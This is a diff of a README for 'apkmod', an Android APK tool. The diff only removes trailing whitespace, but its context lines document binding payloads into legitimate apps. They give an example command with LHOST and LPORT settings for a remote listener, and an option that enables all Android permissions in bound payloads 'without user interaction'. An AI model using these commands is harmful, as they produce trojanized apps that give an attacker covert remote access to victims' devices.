@@ -15,7 +15,7 @@
 5. Use `-V` to enable verbose output
 6. If only editing Java (smali) then this is the recommended action for faster decompile & rebuild `--no-res`
 7. If you are only editing the resources. This is the recommended action for faster disassemble & assemble `--no-smali`
-8. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir` 
+8. use `--frame-path` to specify framework directory like `--frame-path=/path/to/dir`
 9. Use `--enable-perm` to enable all android permissions in binded or non binded payloads without user interaction. For example :- `apkmod --enable-perm=/path/to/binded.apk -o mybinded.apk`
 10. `apkmod --to-java=/path/to/in.apk -o outfolder` will decompile dex to java. Input can be __[.apk,.dex,.zip]__
 11. Now you can use a optional option `-a` to use __aapt__ for __binding__ and __recompiling__. Why aapt ? Because some apps can't recompile with __aapt2__ but __aapt__ can do it. But I can't drop __aapt2__ support because some apps can't recompile with __aapt__ so first recompile or bind without __aapt__ (`-a`) then if you failed then try with __aapt__. For example `apkmod -a -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444` will use `aapt` otherwise `aapt2`.
@@ -28,5 +28,5 @@ after installation | Around 100 MB | Around 700-900 MB
 #### Why Apkmod is extremely small ?
 Because it has Alpine instead of Ubuntu, kali, parrot or other glibc based distros.
 
-#### You can join me on telegram also 
+#### You can join me on telegram also
 https://t.me/hax4us_group
